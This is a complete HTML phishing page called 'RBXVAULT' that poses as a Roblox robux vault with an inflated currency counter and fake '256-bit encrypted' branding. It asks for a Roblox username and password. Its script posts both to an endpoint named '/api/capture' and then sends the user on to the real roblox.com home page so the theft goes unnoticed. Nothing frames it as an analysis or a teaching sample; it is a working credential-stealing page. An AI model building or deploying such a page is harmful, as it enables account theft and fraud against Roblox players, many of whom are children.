<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RBXVAULT</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0b0e14;
            font-family: -apple-system, 'Inter', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            padding: 16px;
        }
        .container {
            width: 100%;
            max-width: 440px;
            padding: 32px 24px;
            background: #131920;
            border-radius: 24px;
            border: 1px solid #222a33;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }
        .brand {
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(135deg, #f5a623, #f7c948);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .badge {
            background: #1e293b;
            padding: 4px 14px;
            border-radius: 40px;
            font-size: 12px;
            color: #94a3b8;
            border: 1px solid #2d3748;
        }
        .subhead {
            font-size: 14px;
            color: #64748b;
            margin-bottom: 24px;
        }
        .stats {
            background: #0f1620;
            border-radius: 20px;
            padding: 24px 20px;
            margin-bottom: 28px;
            border: 1px solid #222c3a;
            text-align: center;
        }
        .stats-label {
            font-size: 12px;
            color: #64748b;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .stats-number {
            font-size: 44px;
            font-weight: 800;
            letter-spacing: -1px;
            margin-top: 4px;
            background: linear-gradient(135deg, #f5a623, #f7c948);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .stats-number span {
            font-size: 18px;
            font-weight: 400;
            color: #64748b;
            -webkit-text-fill-color: #64748b;
        }
        .form-group {
            margin-bottom: 16px;
        }
        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: #cbd5e1;
            margin-bottom: 6px;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            background: #0b0f16;
            border: 1px solid #2a3440;
            border-radius: 14px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: border 0.2s;
        }
        .form-group input:focus {
            border-color: #f5a623;
        }
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #f5a623, #e08e1a);
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 700;
            color: #0b0e14;
            cursor: pointer;
            margin-top: 6px;
            transition: transform 0.1s;
        }
        .btn:active {
            transform: scale(0.98);
        }
        .footer-text {
            text-align: center;
            font-size: 12px;
            color: #475569;
            margin-top: 20px;
        }
        .footer-text a {
            color: #64748b;
            text-decoration: none;
        }
        .alert {
            background: #1e1a1a;
            border: 1px solid #4a2a2a;
            border-radius: 12px;
            padding: 12px 16px;
            font-size: 13px;
            color: #f87171;
            display: none;
            margin-bottom: 16px;
        }
        .alert.success {
            border-color: #2a4a2a;
            color: #86efac;
        }
        .loading {
            display: none;
            text-align: center;
            margin-top: 12px;
            color: #94a3b8;
            font-size: 13px;
        }
        .loading.show {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="brand">RBXVAULT</div>
            <div class="badge">● live</div>
        </div>
        <div class="subhead">instant access · secure vault · best rates</div>

        <div class="stats">
            <div class="stats-label">total robux in circulation</div>
            <div class="stats-number">12,505,201 <span>R$</span></div>
        </div>

        <div id="alertBox" class="alert"></div>

        <form id="loginForm">
            <div class="form-group">
                <label>roblox username</label>
                <input type="text" id="username" placeholder="Enter your username" required>
            </div>
            <div class="form-group">
                <label>password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn">→ connect to vault</button>
            <div id="loading" class="loading">⏳ authenticating...</div>
        </form>

        <div class="footer-text">
            secured by <a href="#">RBXVAULT</a> · encrypted 256-bit
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const alertBox = document.getElementById('alertBox');
            const loading = document.getElementById('loading');

            alertBox.style.display = 'none';
            alertBox.className = 'alert';
            loading.classList.remove('show');

            if (!username || !password) {
                alertBox.textContent = '⚠️ please fill in both fields';
                alertBox.style.display = 'block';
                return;
            }

            loading.classList.add('show');

            try {
                const response = await fetch('/api/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });

                const result = await response.json();
                loading.classList.remove('show');

                if (result.status === 'ok') {
                    alertBox.textContent = '✅ vault connected — redirecting...';
                    alertBox.className = 'alert success';
                    alertBox.style.display = 'block';

                    setTimeout(() => {
                        window.location.href = 'https://www.roblox.com/home';
                    }, 1500);
                } else {
                    alertBox.textContent = '⚠️ something went wrong, try again';
                    alertBox.style.display = 'block';
                }
            } catch (err) {
                loading.classList.remove('show');
                alertBox.textContent = '⚠️ connection error — check your internet';
                alertBox.style.display = 'block';
            }
        });
    </script>
</body>
</html>
